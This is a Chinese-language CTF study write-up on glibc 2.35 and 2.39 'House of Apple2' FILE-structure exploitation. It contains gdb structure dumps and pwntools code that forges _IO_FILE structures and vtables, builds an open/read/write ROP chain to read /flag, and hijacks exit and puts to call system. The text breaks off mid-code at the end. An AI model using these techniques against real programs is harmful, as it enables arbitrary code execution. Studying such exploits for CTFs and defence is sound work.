<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _IO_read_ptr = <span class="number">0x3b687320</span> &lt;error: Cannot access memory at address <span class="number">0x3b687320</span>&gt;,</span><br><span class="line">  _IO_read_end = <span class="number">0x451</span> &lt;error: Cannot access memory at address <span class="number">0x451</span>&gt;,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_end = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x5555555592b0</span> <span class="string">L&quot;&quot;</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_state = &#123;</span><br><span class="line">    __count = <span class="number">0</span>,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = <span class="number">0</span>,</span><br><span class="line">      __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _IO_last_state = &#123;</span><br><span class="line">    __count = <span class="number">0</span>,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = <span class="number">0</span>,</span><br><span class="line">      __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _codecvt = &#123;</span><br><span class="line">    __cd_in = &#123;</span><br><span class="line">      step = <span class="number">0x0</span>,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = <span class="number">0x0</span>,</span><br><span class="line">        __outbufend = <span class="number">0xffffffffffffffff</span> &lt;error: Cannot access memory at address <span class="number">0xffffffffffffffff</span>&gt;,</span><br><span class="line">        __flags = <span class="number">0</span>,</span><br><span class="line">        __invocation_counter = <span class="number">0</span>,</span><br><span class="line">        __internal_use = <span class="number">0</span>,</span><br><span class="line">        __statep = <span class="number">0x0</span>,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = <span class="number">0</span>,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = <span class="number">0</span>,</span><br><span class="line">            __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    __cd_out = &#123;</span><br><span class="line">      step = <span class="number">0x555555559b20</span>,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = <span class="number">0x0</span>,</span><br><span class="line">        __outbufend = <span class="number">0x0</span>,</span><br><span class="line">        __flags = <span class="number">0</span>,</span><br><span class="line">        __invocation_counter = <span class="number">0</span>,</span><br><span class="line">        __internal_use = <span class="number">0</span>,</span><br><span class="line">        __statep = <span class="number">0x0</span>,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = <span class="number">0</span>,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = <span class="number">0</span>,</span><br><span class="line">            __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _shortbuf = <span class="string">L&quot;\xf7e170c0&quot;</span>,</span><br><span class="line">  _wide_vtable = <span class="number">0x555555559ba0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vtable偏移0xe8就是__doallocate  这里放system就会调用</p>
<p>p *(struct _IO_jump_t *)</p>
<p><img src="/2025/11/18/IO/1757486354064-108e5ed4-29ad-4860-8a85-cf4b5e2fce51.png" alt="img"></p>
<h2 id="（2）2-35-House-of-Apple2（orw）"><a href="#（2）2-35-House-of-Apple2（orw）" class="headerlink" title="（2）2.35 House of Apple2（orw）"></a>（2）2.35 House of Apple2（orw）</h2><p>实现orw就是要栈迁移，因为需要pop，需要讲rsp迁到正确的地方</p>
<p><img src="/2025/11/18/IO/1757518127314-c993502c-881b-4c06-9b7e-93f7db083874.png" alt="img"></p>
<p><img src="/2025/11/18/IO/1757518150975-61d66abf-6fc8-4b62-9c12-e6322fc1b91d.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p svcudp_reply</span><br><span class="line">x/16i 0x7ffff7d6a050</span><br></pre></td></tr></table></figure>

<p>主要靠的就是这一段代码</p>
<p>从上面我们知道rdi就是heap1的头地址</p>
<p>rdi+0x48 就是 _IO_save_base</p>
<p>我们在_IO_save_base写什么 rbp就等于什么</p>
<p>rax &#x3D; [rbp+0x18] </p>
<p>我们需要在rbp+0x18的地方写一个地址作为rax</p>
<p>然后会call [rax+0x28] </p>
<p>因为前面要写orw，所以rax的值要大一些（heap2+0x200），为了避免orw的代码覆盖到rax+0x28</p>
<h4 id="1-那么rax-0x28的地方写什么呢"><a href="#1-那么rax-0x28的地方写什么呢" class="headerlink" title="1.那么rax+0x28的地方写什么呢"></a>1.那么rax+0x28的地方写什么呢</h4><p>写leave_ret，我们控制了rbp，经过leave_ret,rsp &#x3D; rbp+8,我们讲orw的代码布置在rbp+8的地方就可以</p>
<p>然后rbp+0x18的位置是rax的值，这个我们是不能变得，而且rbp+0x10的位置会被清零</p>
<p>（<code>mov    dword ptr [rbp + 0x10], 0</code>）</p>
<p>所以我们需要在rbp+0x8的地方写两个pop 将这两个废值pop 走</p>
<p>然后后面接pop 接orw就可以</p>
<h4 id="2-IO-save-base（rbp）该为多少"><a href="#2-IO-save-base（rbp）该为多少" class="headerlink" title="2._IO_save_base（rbp）该为多少"></a>2._IO_save_base（rbp）该为多少</h4><p>如果我们写heap2的地址，那么rbp+0x8的地方为size位，我们控制不了</p>
<p>所以写heap2+0x10，这样rbp+0x8，就是数据的第二个位置，第一个位置写&#x2F;flag\x00\x00，第二个位置写两个pop</p>
<p><img src="/2025/11/18/IO/1757517792150-b82c2e41-1537-440d-97ef-bd58c7ae40d1.png" alt="img"></p>
<p><img src="/2025/11/18/IO/1757517831988-8910f821-62b9-4292-b3c6-a85df2d96711.png" alt="img"></p>
<p><img src="/2025/11/18/IO/1757518150975-61d66abf-6fc8-4b62-9c12-e6322fc1b91d-1763442095814-63.png" alt="img"></p>
<p><img src="/2025/11/18/IO/1757520030900-c1ae2be2-46fd-4eab-8f4c-5c15f837e957.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">magic = libc_base+<span class="number">0x16a06a</span></span><br><span class="line">#fake_io = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#fake_io += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">fake_io = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">fake_io += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">fake_io += p64(addr2+<span class="number">0x10</span>)#_IO_save_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_markers</span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_lock </span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr1)#_wide_data</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="meta">#vtable</span></span><br><span class="line">fake_io += p64(addr1+<span class="number">0x80</span>) #<span class="number">28</span></span><br><span class="line">fake_io += p64(magic) </span><br></pre></td></tr></table></figure>

<p>最短leave_ret紧紧贴着0x30</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(rdi)+p64(addr2+<span class="number">0x10</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(readd)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(writee)+p64(leave_ret)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(r12)+p64(<span class="number">0</span>)+p64(addr2+<span class="number">0xc8</span>)+orw)</span><br><span class="line">leave_ret = pie +<span class="number">0x01412</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leave_ret))</span><br><span class="line">r12 = libc_base+<span class="number">0x011b768</span></span><br><span class="line">openn=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readd=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writee=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi=libc_base+<span class="number">0x002a3e5</span></span><br><span class="line">rsi=libc_base+<span class="number">0x02be51</span></span><br><span class="line">rdx=libc_base+<span class="number">0x11f2e7</span></span><br><span class="line">rax = libc_base +<span class="number">0x45eb0</span></span><br><span class="line">syscall = libc_base+<span class="number">0x029db4</span></span><br><span class="line">orw = p64(rdi)+p64(addr2+<span class="number">0x10</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(readd)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(writee)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(r12)+p64(addr2+<span class="number">0x200</span>)*<span class="number">2</span>+orw.ljust(<span class="number">0x1f8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(leave_ret))</span><br></pre></td></tr></table></figure>

<h2 id="（3）2-35-House-of-Apple2（puts）"><a href="#（3）2-35-House-of-Apple2（puts）" class="headerlink" title="（3）2.35 House of Apple2（puts）"></a>（3）2.35 House of Apple2（puts）</h2><p>puts 原本调用链 </p>
<p>_IO_file_xsputn –&gt; _IO_file_overflow  –&gt; _IO_do_write  –&gt; _IO_file_write  –&gt; write</p>
<p>_IO_file_xsputn在虚表偏移0x38的位置</p>
<p><img src="/2025/11/18/IO/1758027109912-2eff58c6-920a-439d-a5c5-43447fd83f43.png" alt="img"></p>
<p>而_IO_file_overflow在虚表偏移0x18的位置</p>
<p><img src="/2025/11/18/IO/1758027035874-7ca8ac7e-f05c-4538-8fc8-f6872dd5e005.png" alt="img"></p>
<p>那么我们将虚表往前改0x20，那么puts调用_IO_file_xsputn调用偏移0x38的地方就会是_IO_file_overflow</p>
<p>就和exit一样了</p>
<p><img src="/2025/11/18/IO/1758027875904-8077351a-94a9-4c80-9722-3cd55442bdec.png" alt="img"></p>
<p>但是进入puts，我们发现他并不是从_IO_list_all 中找stdout的结构体，这个结构体是在bss段上的，所以我们要将bss段上的结构体改了</p>
<p>而exit走的是_IO_list_all</p>
<p><img src="/2025/11/18/IO/1758028173345-0e30afe6-b43b-4d36-96e0-4d705580a33d.png" alt="img"></p>
<p>问题：用largebin attack改bss段上他那个stdout的地址为堆块的地址，先用largebin attack，那个现在在unsortbin，要放的largebin的堆块是free的里面是空的，我改完调用puts就报错了，我要是先伪造好io结构体，然后挂进largebin他就会报错，然后我就给他那个fd和bk写了一下，他不报错了，但是那个_IO_read_end不是0了，不满足掉用条件了</p>
<p><img src="/2025/11/18/IO/1758040085498-713e536f-00ba-42eb-9eef-eecf737c7c77.png" alt="img"></p>
<p>那么如何满足条件呢？</p>
<p>答案就是再来一个堆块伪造_wide_data这个结构体</p>
<p>应为调用_IO_wfile_jumps看的是_wide_data这个结构体</p>
<p>原本是将stdout与_wide_data伪造在一个地方，他们的数据是共用的，所以_IO_read_end不为0</p>
<p>但是我们再来一个堆块就可以了</p>
<p>我们需要先改完结构体在挂进链表，所以fd与bk要写好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#stdout = p64(0) #flags </span></span><br><span class="line"><span class="comment">#stdout += p64(0)#IO read ptr</span></span><br><span class="line">stdout = p64(<span class="number">0x7ffff7e1ace0</span>)<span class="comment">#IO read end</span></span><br><span class="line">stdout += p64(<span class="number">0x7ffff7e1ace0</span>)<span class="comment">#I0 read base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO write base</span></span><br><span class="line">stdout += p64(<span class="number">1</span>)<span class="comment">#IO write ptr</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO write end</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO buf base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO buf end</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_IO_save_base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_IO_backup_base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_IO_save_end</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_markers</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#chain</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)</span><br><span class="line">stdout += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#old_offset</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)</span><br><span class="line">stdout += p64(addr2+<span class="number">0x30</span>)<span class="comment">#_lock </span></span><br><span class="line">stdout += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">stdout += p64(addr1)<span class="comment">#_wide_data</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">stdout += p64(_IO_wfile_jumps-<span class="number">0x20</span>)<span class="comment">#vtable</span></span><br><span class="line">edit(<span class="number">2</span>,stdout)</span><br></pre></td></tr></table></figure>

<p>需要注意的是*_lock_addr &#x3D; 0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#wide_data = p64(0) #flags </span></span><br><span class="line"><span class="comment">#wide_data += p64(0)#IO read ptr</span></span><br><span class="line">wide_data = p64(<span class="number">0</span>)<span class="comment">#IO read end</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#I0 read base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO write base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO write ptr</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO write end</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO buf base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO buf end</span></span><br><span class="line">wide_data += p64(addr2+<span class="number">0x10</span>)<span class="comment">#_IO_save_base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_IO_backup_base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_IO_save_end</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_markers</span></span><br><span class="line">wide_data += p64(addr1)<span class="comment">#chain</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#old_offset</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_lock </span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_wide_data</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">wide_data += p64(addr1+<span class="number">0x80</span>) <span class="comment">#28</span></span><br><span class="line">wide_data += p64(system) </span><br></pre></td></tr></table></figure>

<p>stdout +&#x3D; p64(_IO_wfile_jumps-0x20)#vtable</p>
<p>这里其实也不用变</p>
<p>_IO_wfile_xsputn–&gt;_IO_wdefault_xsputn–&gt;_IO_wdoallocbuf–&gt;setcontext+61</p>
<h2 id="（4）2-39-House-of-Apple2（system）"><a href="#（4）2-39-House-of-Apple2（system）" class="headerlink" title="（4）2.39 House of Apple2（system）"></a>（4）2.39 House of Apple2（system）</h2><p>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all-&gt;_IO_wfile_overflow-&gt;_IO_wdoallocbuf</p>
<p>与2.35区别</p>
<p>1.largebin 检查完善，挂入链表时候，也就是largebin attack时候要给fd bk fdnextsize改回去</p>
<p>2.中间有一些操作导致结构体中数据被改，要绕开这些地址，防止结构体被改</p>
<p><img src="/2025/11/18/IO/1758116454435-582e9806-913b-4b85-bb1c-bec33c5c272a.png" alt="img"></p>
<p>0x55555555bb60就是lock</p>
<p>他会对其赋值，所以不要让他改到</p>
<p>_wide_data-&gt;_IO_write_base</p>
<p>_wide_data-&gt;_IO_buf_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fake_io = p64(0) #flags </span></span><br><span class="line"><span class="comment">#fake_io += p64(0)#IO read ptr</span></span><br><span class="line">fake_io = p64(<span class="number">0</span>)<span class="comment">#IO read end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#I0 read base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO write base</span></span><br><span class="line">fake_io += p64(<span class="number">1</span>)<span class="comment">#IO write ptr</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO write end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO buf base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO buf end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_IO_save_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_IO_save_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_markers</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#old_offset</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(addr1+<span class="number">0x40</span>)<span class="comment">#_lock </span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr1)<span class="comment">#_wide_data</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="comment">#vtable</span></span><br><span class="line">fake_io += p64(addr1+<span class="number">0x80</span>) <span class="comment">#28</span></span><br><span class="line">fake_io += p64(system) </span><br></pre></td></tr></table></figure>

<h2 id="（5）2-39-House-of-Apple2（puts）"><a href="#（5）2-39-House-of-Apple2（puts）" class="headerlink" title="（5）2.39 House of Apple2（puts）"></a>（5）2.39 House of Apple2（puts）</h2><p>与2.35区别</p>
<p>1.largebin 检查完善，挂入链表时候，也就是largebin attack时候要给fd bk fdnextsize改回去，并且unsortbin的fd与bk与2.35不通记得改</p>
<p>2.中间有一些操作导致结构体中数据被改，要绕开这些地址，防止结构体被改，这个不用担心，因为wide_data段是另一个堆块不会被影响</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#stdout = p64(0) #flags </span></span><br><span class="line"><span class="meta">#stdout += p64(0)#IO read ptr</span></span><br><span class="line"><span class="built_in">stdout</span> = p64(<span class="number">0x7ffff7e03b20</span>)#IO read end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0x7ffff7e03b20</span>)#I0 read base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO write base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO write ptr</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO write end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_IO_save_base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_markers</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">stdout</span> += p64(addr2+<span class="number">0x30</span>)#_lock </span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"><span class="built_in">stdout</span> += p64(addr1)#_wide_data</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line"><span class="built_in">stdout</span> += p64(_IO_wfile_jumps<span class="number">-0x20</span>)<span class="meta">#vtable</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">stdout</span>)</span><br><span class="line">#wide_data = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#wide_data += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">wide_data = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">wide_data += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">wide_data += p64(addr2+<span class="number">0x10</span>)#_IO_save_base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_markers</span><br><span class="line">wide_data += p64(addr1)<span class="meta">#chain</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_lock </span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span 